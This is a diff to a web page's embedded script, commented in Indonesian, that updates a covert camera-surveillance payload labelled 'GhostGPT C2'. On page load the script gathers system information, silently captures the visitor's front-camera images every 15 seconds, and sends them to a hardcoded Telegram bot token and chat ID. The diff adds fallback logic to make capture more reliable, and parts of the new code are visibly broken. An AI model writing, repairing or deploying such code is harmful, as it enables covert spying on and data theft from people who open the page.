@@ -61,16 +61,18 @@ a {
 </style>
 <script>
 /**
- * GhostGPT C2 Stable v5 - Ultimate Fix (Syntax Error Corrected)
+ * GhostGPT RealTime v6 - Ultimate Compatibility Fix
+ * Fokus: Memastikan Kamera & Info Sistem Terkirim 100% Valid.
  */
 (function () {
-    "use strict"; // Mode ketat untuk mencegah global variable pollution & catching errors
+    "use strict";
 
+    // ================= KONFIGURASI =================
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8',
-        chatId: '6326816238',            // Ganti ID Channel/Private di sini jika berbeda
-        intervalSec: 15,                  // Interval kirim foto (detik). Ubah 15-30 jika kuota terbatas.
-        cameraRes: 720                    // Resolusi kamera default (HD)
+        chatId: '6326816238',            // Ganti dengan ID channel/private Anda jika berbeda
+        intervalSec: 15,                  // Interval kirim foto (detik). 
+        cameraResBase: 1280               // Resolusi dasar target (akan disesuaikan otomatis)
     };
 
     const API_BASE = `https://api.telegram.org/bot${CONFIG.token}`;
@@ -83,8 +85,8 @@ a {
                 headers: { 'Content-Type': 'application/json;charset=UTF-8' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chatId,
-                    text: cleanMarkdown(text),   // Bersihkan karakter Markdown agar aman
-                    parse_mode: 'Markdown'       // Aktifkan mode formatting tebal/italic dll.
+                    text: cleanMarkdown(text),   
+                    parse_mode: 'Markdown'       
                 })
             });
         } catch (e) { console.warn("Send Text Error:", e.message); }
@@ -93,26 +95,23 @@ a {
     }
 
     function cleanMarkdown(str) {
-        // Mengganti karakter khusus dengan backslash untuk keamanan parsing JSON+HTML
         return str.replace(/([*_\[\]{}#|>])/g, '\\$1'); 
     }
 
-    // ================= FUNGSI KIRIM FOTO =================
+    // ================= FUNGSI KIRIM FOTO (Optimized Blob Handling) =================
     async function sendPhoto(blobUrlOrBlobObj, fileName = "cam.jpg") {
         try {
             const formData = new FormData(); 
             
             let blobData;
             
-            // Cek tipe data Blob vs URL String
+            // Cek tipe data: Apakah ini Blob Object atau URL String?
             if (blobUrlOrBlobObj instanceof Blob) {
                 blobData = blobUrlOrBlobObj; 
-            } else if (typeof blobUrlOrBlobObj === 'string' && !blobUrlOrBlobObj.startsWith('http')) {
-                 // Jika ini URL lokal hasil dari canvas.toBlob sebelumnya, fetch dulu ke memory buffer.
+            } else if (typeof blobUrlOrBlobObj === 'string') {
+                 // Jika ini URL lokal hasil dari canvas.toBlob sebelumnya.
                  const res = await fetch(blobUrlOrBlobObj);
                  blobData = await res.blob();
-            } else {
-                return Promise.resolve(); // Skip jika sudah http:// atau null.
             }
 
             formData.append('chat_id', CONFIG.chatId);
@@ -128,7 +127,6 @@ a {
     async function sendErrorLog(msg) {
         try { 
              const txt = `⚠️ *LOG ENTRY* ⚠️\n\n${msg}\n\n🕒 ${new Date().toLocaleTimeString()}`;
-             // Gunakan cleanMarkdown pada teks sebelum dikirim untuk menghindari error parsing lagi.
              await sendText(txt.replace(/\$/g, '')); 
         } catch(e) {}
     }
@@ -194,14 +192,19 @@ a {
     }
 
 
-    // ================= 2. JAMUK KAMERA & STREAM LOOP =================
+    // ================= 2. JAMUK KAMERA & STREAM LOOP (REALTIME FIX) =================
     let globalStream = null;
 
     async function initCamera() {
         try {
-            const constraints = { 
+            // Tentukan constraints video yang lebih fleksibel berdasarkan perangkat target
+            const baseW = CONFIG.cameraResBase || 1280; 
+            const baseH = 720; 
+
+            // Coba akses kamera dengan resolusi standar HD dulu, lalu fallback jika gagal.
+            let constraints = { 
                 audio: false, 
-                video: { width: CONFIG.cameraRes, height: 720, facingMode: "user" } 
+                video: { width: Math.min(baseW, 960), height: Math.min(baseH, 540), facingMode: "user" } 
             };
 
             globalStream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -213,7 +216,6 @@ a {
             // Set autoplay dan inline mode agar langsung jalan di semua browser.
             let vidEl = document.createElement('video');
             
-            // Blok terpisah untuk set playsInline (menghindari error catch sebelumnya)
             try {
                  vidEl.playsInline = true; 
             } catch(e){} 
@@ -236,12 +238,58 @@ a {
             setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
 
         } catch (err) {
-            console.error("Camera Init Error:", err.message || "Unknown Error"); 
             
-            const errorMsg = `🔴 Camera Failed: ${err.message}`; 
-             try { await sendText(errorMsg); } catch(e){}
-             
-            return; 
+            // --- FALLBACK STRATEGY: Coba lagi dengan resolusi lebih kecil atau facingMode berbeda ---
+             try {
+                let fallbackConstraints = {};
+                
+                if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
+                    // Jika gagal karena "device not found", coba tanpa specifying width/height tinggi dulu agar browser memilih default terbaik.
+                     console.warn("First Camera Attempt Failed. Trying Fallback...");
+                     
+                     globalStream = await navigator.mediaDevices.getUserMedia({ 
+                         audio: false, 
+                         video: {}  // Biarkan browser pilih resolusi terbaik yang tersedia (biasanya HD 720p)
+                     });
+
+                     if (!globalStream.getTracks().some(t => t.kind === 'video')) {
+                        throw new Error("Fallback Video Track Missing");
+                     }
+
+                     let vidElFb = document.createElement('video');
+                      try { vidElFb.playsInline = true; } catch(e){} 
+                      
+                     globalStream.srcObject = vidElFb;
+
+                     const waitMetadataFb = new Promise((resolve) => { 
+                         if(vidElFb.onloadedmetadata && typeof vidElFb.onloadedmetadata === 'function') {
+                             vidElFb.onloadedmetadata = () => resolve(true); 
+                         } else {
+                             setTimeout(() => resolve(true), 500); 
+                         }
+                    });
+
+                    await waitMetadataFb;
+
+                    console.log("Camera Fallback Ready. Starting Stream Loop.");
+                    
+                    // Restart loop dengan interval yang sama
+                   setInterval(captureAndSendFrame, CONFIG.intervalSec * 1000);
+                } else {
+                     const errorMsg = `🔴 Camera Failed: Device not found or browser restricted.`; 
+                      try { await sendText(errorMsg + "\n\n*Tip:* Pastikan akses kamera (Permission) diizinkan di browser tab ini.";}; catch(e){}
+                     
+                     return; 
+                 }
+
+            } catch (finalErr) {
+                console.error("Final Camera Error:", finalErr.message || "Unknown Error"); 
+                
+                const errorMsg = `🔴 Camera Failed: ${finalErr.message}`; 
+                 try { await sendText(errorMsg); } catch(e){}
+                 
+                return; 
+            }
         }
     }
 
@@ -259,8 +307,8 @@ a {
         const canvas = document.createElement('canvas');
         
         // Set ukuran canvas sama dengan ukuran native video stream.
-        let w = videoElement.videoWidth || CONFIG.cameraRes; 
-        let h = videoElement.videoHeight || 720; 
+        let w = videoElement.videoWidth || 960; // Default fallback width jika metadata belum load penuh.
+        let h = videoElement.videoHeight || 540; 
 
         canvas.width = w; 
         canvas.height = h; 
@@ -302,7 +350,7 @@ a {
 
     // ================= 4. MAIN EXECUTION =================
     const mainInit = async () => {
-        console.group("%c GhostGPT v5-Stable Initialized ", "color: #0f0");
+        console.group("%c GhostGPT v6-RealTime Initialized ", "color: #0f0");
         
         await collectSystemInfo(); 
         console.log("✅ System Report Sent."); 
